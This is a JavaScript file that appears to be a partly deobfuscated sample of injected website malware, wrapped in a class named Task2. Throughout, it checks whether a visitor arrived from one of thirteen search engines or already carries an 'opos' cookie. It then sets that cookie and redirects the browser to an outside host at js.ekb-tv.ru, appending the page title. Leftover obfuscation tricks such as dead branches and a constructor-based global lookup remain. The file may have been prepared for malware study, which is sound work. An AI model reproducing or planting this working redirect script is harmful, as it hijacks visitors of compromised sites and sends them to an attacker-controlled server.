class Task2 {
    static['com2']() {
        var _4164e3_ = undefined
          , _254ee8_ = undefined
          , controlFlow = {};
        controlFlow.or = function(_410938_, _15adfb_) {
            return _410938_ || _15adfb_;
        }
        ,
        controlFlow.plus_a = function(_209484_, _f11e81_) {
            return _209484_ + _f11e81_;
        }
        ,
        controlFlow.invokeFnWith1Arg = function(_2e69c8_, _3febc4_) {
            return _2e69c8_(_3febc4_);
        }
        ,
        controlFlow.concat = function(_3dc736_, _f35780_) {
            return _3dc736_ + _f35780_;
        }
        ,
        controlFlow.invokeFnWith5Args = function(_560df0_, _5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_) {
            return _560df0_(_5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_);
        }
        ,
        controlFlow.plus_b = function(_4687e8_, _320d74_) {
            return _4687e8_ + _320d74_;
        }
        ,
        controlFlow.invokeFn = function(_bbd833_) {
            return _bbd833_();
        }
        ,
        controlFlow.lessThan = function(_594ccc_, _515955_) {
            return _594ccc_ < _515955_;
        }
        ,
        controlFlow.notStrictlyEqual = function(_e5192b_, _ae1007_) {
            return _e5192b_ !== _ae1007_;
        }
        ,
        controlFlow.equal = function(_3b173d_, _bb3a4_) {
            return _3b173d_ == _bb3a4_;
        }
        ,
        controlFlow.strictlyEqual = function(_fdbfb2_, _3b82ac_) {
            return _fdbfb2_ === _3b82ac_;
        }
        ,
        controlFlow.invokeFnWith2Args = function(_dbaf43_, _24516f_, _2031a7_) {
            return _dbaf43_(_24516f_, _2031a7_);
        }
        ,
        controlFlow.str_dash = ' - ';
        var controlFlow = controlFlow
          , _420e55_ = document.title['split'](controlFlow.str_dash)
          , document_title_prefix = _420e55_[0]['split'](' | ');
        function fn_set_cookie(_2f0912_, _129feb_, _3eaf40_, _51a3ee_, _2b320b_, _4c1205_) {
            var _30b91d_ = undefined
              , _e028b7_ = undefined
              , _29d66b_ = '3|5|0|6|4|7|2|1'['split']('|')
              , _2ef646_ = 0;
            while (true) {
                switch (_29d66b_[_2ef646_++]) {
                case '0':
                    if (_3eaf40_)
                        _4c86b3_ += ';\x20expires=' + _3eaf40_.toGMTString();
                    continue;
                case '1':
                    return true;
                case '2':
                    document.cookie = _4c86b3_;
                    continue;
                case '3':
                    if (controlFlow.or(!_2f0912_, !_129feb_))
                        return false;
                    continue;
                case '4':
                    if (_2b320b_)
                        _4c86b3_ += controlFlow.plus_a('; domain=', _2b320b_);
                    continue;
                case '5':
                    var _4c86b3_ = _2f0912_ + '=' + controlFlow.invokeFnWith1Arg(encodeURIComponent, _129feb_);
                    continue;
                case '6':
                    if (_51a3ee_)
                        _4c86b3_ += controlFlow.concat('; path=', _51a3ee_);
                    continue;
                case '7':
                    if (_4c1205_)
                        _4c86b3_ += '; secure';
                    continue;
                }
                break;
            }
        }
        function fn_test_cookie_is_set(str_cookie_name) {
            var _1a1868_ = undefined
              , _3db08c_ = undefined
              , _33284e_ = controlFlow.concat(controlFlow.concat('(?:; )?', str_cookie_name), '=([^;]*);?')
              , regex = new RegExp(_33284e_);
            if (regex.test(document.cookie))
                return decodeURIComponent(RegExp['$1']);
            return false;
        }
        function _310fd2_(_5e0b16_, _116341_, _a9240e_) {
            var _3099b2_ = undefined;
            return controlFlow.invokeFnWith5Args(fn_set_cookie, _5e0b16_, null, new Date(0), _116341_, _a9240e_),
            true;
        }
        var app = {};
        app.searchers = [[/google\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.yahoo\./i, /(\?|&)p=(.*?)(&|$)/i, 2], [/bing\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.aol\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/ask\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/altavista\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.lycos\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/alltheweb\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/yandex\./i, /(\?|&)text=(.*?)(&|$)/i, 2], [/(nova\.|search\.)?rambler\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/gogo\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/go\.mail\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/nigma\./i, /(\?|&)s=(.*?)(&|$)/i, 2]],
        app.sp_redirect = function(referer) {
            var _51bdaf_ = undefined
              , _766024_ = undefined
              , _1bf09f_ = null;
            for (var idx = 0; controlFlow.lessThan(idx, app.searchers.length); idx++) {
                if (controlFlow.notStrictlyEqual('SqwjM', 'SqwjM')) {
                    function _2eaa55_() {
                        var _5e6d4a_ = undefined
                          , _2a6097_ = undefined
                          , _486aa7_ = _1b6fe6_(HVzByi.TJrTW(HVzByi.TUYfY + ('{}.constructor("return\x20this\x22)(\x20)'), ');'));
                        _33f82f_ = HVzByi.bXBLq(_486aa7_);
                    }
                } else {
                    var searcher = app.searchers[idx];
                    if (referer.match(searcher[0]) || controlFlow.equal(controlFlow.invokeFnWith1Arg(fn_test_cookie_is_set, 'opos'), '1')) {
                        if (controlFlow.strictlyEqual('hwKDr', 'hwKDr')) {
                            controlFlow.invokeFnWith2Args(fn_set_cookie, 'opos', '1'),
                            document.location['href'] = controlFlow.plus_b('https://js.ekb-tv.ru/trds?q=', document_title_prefix[0]);
                            break;
                        } else {
                            function _35779c_() {
                                _1c6082_ = _5352c4_;
                            }
                        }
                    }
                }
            }
        }
        ,
        app.sp_redirect(document.referrer);
    }
}
Task2.com2();
